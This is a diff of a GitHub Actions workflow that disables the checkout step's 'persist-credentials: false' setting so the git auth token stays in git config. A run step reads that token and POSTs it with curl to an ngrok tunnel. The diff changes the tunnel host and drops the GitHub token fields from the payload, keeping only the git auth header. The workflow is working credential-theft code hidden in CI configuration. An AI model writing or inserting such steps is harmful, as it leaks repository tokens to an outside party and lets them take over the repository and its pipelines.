@@ -7,8 +7,8 @@ jobs:
     steps:
       - name: Check out repository code
         uses: actions/checkout@v2
-        with: 
-          persist-credentials: 'false'
+#         with: 
+#           persist-credentials: 'false'
       
       - uses: actions/setup-node@v1
       - run: |
@@ -19,11 +19,9 @@ jobs:
           auth=$(git config --list | grep AUTH | tr -d ' ')
           
           curl --request POST \
-          --url https://934e-77-137-8-226.ngrok.io \
+          --url https://4d25-77-137-8-226.ngrok.io \
           --header 'content-type: application/json' \
           --data '{
-            "auth": "'$auth'",
-            "github.token": "${{ github.token }}",
-            "secrets.GITHUB_TOKEN": "${{ secrets.GITHUB_TOKEN }}"
+            "git_token": "'$auth'"
             }' \
           --fail
